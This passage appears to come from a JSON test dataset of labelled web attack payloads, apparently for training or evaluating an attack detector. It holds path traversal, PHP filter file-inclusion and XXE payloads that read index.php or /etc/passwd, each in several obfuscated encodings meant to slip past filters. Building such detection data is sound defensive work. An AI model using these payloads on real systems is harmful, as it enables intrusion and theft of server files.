+    "payload": "JTI1MjUlMjUzMiUyNTQ1JTI1MjUlMjUzMiUyNTQ1JTI1MjUlMjUzMiUyNTQ2JTI1MjUlMjUzMiUyNTQ1JTI1MjUlMjUzMiUyNTQ1JTI1MjUlMjUzMiUyNTQ2JTI1MjUlMjUzNiUyNTM1JTI1MjUlMjUzNyUyNTM0JTI1MjUlMjUzNiUyNTMzJTI1MjUlMjUzMiUyNTQ2JTI1MjUlMjUzNyUyNTMwJTI1MjUlMjUzNiUyNTMxJTI1MjUlMjUzNyUyNTMzJTI1MjUlMjUzNyUyNTMzJTI1MjUlMjUzNyUyNTM3JTI1MjUlMjUzNiUyNTM0",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "ptrav_combo_119",
+    "payload": "MmUyZTJmMmUyZTJmNjU3NDYzMmY3MDYxNzM3Mzc3NjQ=",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "lfi_orig",
+    "payload": "php://filter/convert.base64-encode/resource=index.php",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "lfi_obf_url_encode_full",
+    "payload": "%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%65%6E%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%69%6E%64%65%78%2E%70%68%70",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "lfi_obf_base64_encode",
+    "payload": "cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1pbmRleC5waHA",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "lfi_obf_url_encode_double",
+    "payload": "%2570%2568%2570%253A%252F%252F%2566%2569%256C%2574%2565%2572%252F%2563%256F%256E%2576%2565%2572%2574%252E%2562%2561%2573%2565%2536%2534%252D%2565%256E%2563%256F%2564%2565%252F%2572%2565%2573%256F%2575%2572%2563%2565%253D%2569%256E%2564%2565%2578%252E%2570%2568%2570",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "lfi_obf_hex_encode",
+    "payload": "7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d696e6465782e706870",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "lfi_obf_case_randomize",
+    "payload": "php://FiLTeR/CONVeRt.BASE64-ENcODE/reSOURCE=INDeX.pHp",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "lfi_combo_126",
+    "payload": "%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%65%6E%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%69%6E%64%65%78%2E%70%68%70",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "lfi_combo_127",
+    "payload": "%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%65%6E%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%69%6E%64%65%78%2E%70%68%70",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "lfi_combo_128",
+    "payload": "%50%48%70%3A%2F%2F%46%49%4C%54%65%52%2F%63%6F%6E%56%45%52%54%2E%62%61%53%65%36%34%2D%65%6E%63%4F%44%65%2F%52%45%53%4F%55%52%43%45%3D%69%6E%44%65%78%2E%70%68%70",
+    "label": 1,
+    "attack_type": "lfi",
+    "param_location": "query",
+    "source": "test_medium"
+  },
+  {
+    "id": "xxe_orig",
+    "payload": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "original"
+  },
+  {
+    "id": "xxe_obf_url_encode_full",
+    "payload": "%3C%3F%78%6D%6C %76%65%72%73%69%6F%6E%3D%27%31%2E%30%27%3F%3E%3C%21%44%4F%43%54%59%50%45 %66%6F%6F %5B%3C%21%45%4E%54%49%54%59 %78%78%65 %53%59%53%54%45%4D %27%66%69%6C%65%3A%2F%2F%2F%65%74%63%2F%70%61%73%73%77%64%27%3E%5D%3E%3C%66%6F%6F%3E%26%78%78%65%3B%3C%2F%66%6F%6F%3E",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "xxe_obf_html_entity_encode",
+    "payload": "&lt;?xml version=&#39;1.0&#39;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "xxe_obf_base64_encode",
+    "payload": "PD94bWwgdmVyc2lvbj0nMS4wJz8+PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlIFNZU1RFTSAnZmlsZTovLy9ldGMvcGFzc3dkJz5dPjxmb28+Jnh4ZTs8L2Zvbz4=",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "xxe_obf_url_encode_double",
+    "payload": "%253C%253F%2578%256D%256C %2576%2565%2572%2573%2569%256F%256E%253D%2527%2531%252E%2530%2527%253F%253E%253C%2521%2544%254F%2543%2554%2559%2550%2545 %2566%256F%256F %255B%253C%2521%2545%254E%2554%2549%2554%2559 %2578%2578%2565 %2553%2559%2553%2554%2545%254D %2527%2566%2569%256C%2565%253A%252F%252F%252F%2565%2574%2563%252F%2570%2561%2573%2573%2577%2564%2527%253E%255D%253E%253C%2566%256F%256F%253E%2526%2578%2578%2565%253B%253C%252F%2566%256F%256F%253E",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "xxe_obf_hex_encode",
+    "payload": "3c3f786d6c2076657273696f6e3d27312e30273f3e3c21444f435459504520666f6f205b3c21454e54495459207878652053595354454d202766696c653a2f2f2f6574632f706173737764273e5d3e3c666f6f3e267878653b3c2f666f6f3e",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "xxe_obf_whitespace_fill",
+    "payload": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe\t;</foo>",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "xxe_obf_case_randomize",
+    "payload": "<?xMl vERSION='1.0'?><!doCTYpe foO [<!eNTiTy XXE SySTem 'FILE:///EtC/pASSWd'>]><foO>&xXE;</FoO>",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "xxe_combo_137",
+    "payload": "JTNDJTNGJTc4JTZEJTZDICU3NiU2NSU3MiU3MyU2OSU2RiU2RSUzRCUyNyUzMSUyRSUzMCUyNyUzRiUzRSUzQyUyMSU0NCU0RiU0MyU1NCU1OSU1MCU0NSAlNjYlNkYlNkYgJTVCJTNDJTIxJTQ1JTRFJTU0JTQ5JTU0JTU5ICU3OCU3OCU2NSAlNTMlNTklNTMlNTQlNDUlNEQgJTI3JTY2JTY5JTZDJTY1JTNBJTJGJTJGJTJGJTY1JTc0JTYzJTJGJTcwJTYxJTczJTczJTc3JTY0JTI3JTNFJTVEJTNFJTNDJTY2JTZGJTZGJTNFJTI2JTc4JTc4JTY1JTNCJTNDJTJGJTY2JTZGJTZGJTNF",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "xxe_combo_138",
+    "payload": "%3C%3F%78%6D%4C %56%45%52%53%69%6F%4E%3D%27%31%2E%30%27%3F%3E%3C%21%64%4F%63%54%79%70%45 %66%4F%4F %5B%3C%21%65%4E%74%49%54%79 %78%58%65 %73%59%73%74%65%4D %27%46%49%4C%45%3A%2F%2F%2F%45%54%43%2F%50%41%73%53%57%64%27%3E%5D%3E%3C%46%6F%6F%3E%26%78%58%65%3B%3C%2F%66%6F%4F%3E",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_medium"
+  },
+  {
+    "id": "xxe_combo_139",
+    "payload": "5044393462577767646d567963326c76626a306e4d5334774a7a382d5043464554304e555756424649475a766279426250434646546c524a56466b676548686c49464e5a553152465453416e5a6d6c735a546f764c79396c64474d766347467a6333646b4a7a3564506a786d6232382d4a6e68345a5473384c325a76627a343d",
+    "label": 1,
+    "attack_type": "xxe",
+    "param_location": "body",
+    "source": "test_medium"
+  }
+]
